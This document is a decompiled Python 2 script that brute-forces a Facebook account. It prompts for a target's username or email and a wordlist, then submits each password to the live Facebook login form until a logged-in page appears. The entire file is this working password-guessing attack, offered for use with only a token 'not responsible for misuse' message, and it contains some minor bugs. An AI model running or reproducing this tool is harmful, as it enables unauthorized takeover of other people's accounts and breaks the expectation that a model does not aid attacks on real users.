
# Python Auto Dis Parser 1.0.1
# Author : HTR-TECH | TAHMID RAYAT
# https://linktr.ee/tahmid.rayat
# https://fb.me/tahmid.rayat.official
# ------------------------------------------
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Embedded file name: dg
import time, os
os.system('clear')
time.sleep(0.5)
try:
    import mechanize
except ModuleNotFoundError:
    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
    exit()

time.sleep(0.5)
user = raw_input('[\xf0\x9f\x92\x80] \x1b[1;95mTarget Username / id / Email -->  ')
time.sleep(0.8)
wrdlstFileName = raw_input('\n\x1b[1;94mWordlist dvl.txt >> ')
try:
    wordlist = open(wrdlstFileName, 'r')
except FileNotFoundError:
    print '\n \x1b[1;91m[!] File Not Found!'
    exit()

time.sleep(0.8)
print '\n\n \x1b[1;93mCracking ' + user + ' \x1b[1;93mNow...'
time.sleep(1)
print '\n \x1b[1;96mTHE COMMANDS BY TECH QAISER\n'
for password in wordlist:
    if password == '' or password == ' ':
        pass
    else:
        try:
            browser = mechanize.Browser()
            browser.set_handle_robots(False)
            browser.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36')]
            fb = browser.open('https://facebook.com')
            dos = open('Facebook-Log.txt', 'w+')
            browser.select_form(nr=0)
            browser.form['email'] = user
            browser.form['pass'] = password
            browser.method = 'POST'
            browser.submit()
            dos.write(browser.open('https://facebook.com').read())
            dos.seek(0)
            text = dos.read().decode('UTF-8')
            if text.find('home_icon', 0, len(text)) != -1:
                print ' \x1b[1;94mWow Password Found : ' + password
                dos.close()
                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                exit()
            else:
                print '\x1b[1;91m[!] Wrong Password! > ' + str(password)
        except KeyboardInterrupt:
            print '\n \x1b[1;92mI am not responsible For Any Miss Use\n   Exiting..'
            dos.close()
            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
            exit()

time.sleep(1)
print ' \x1b[1;91m [!] Failed To Crack Because There Is not Correct Password in your pass List'
time.sleep(0.8)
dos.close()
os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
exit()
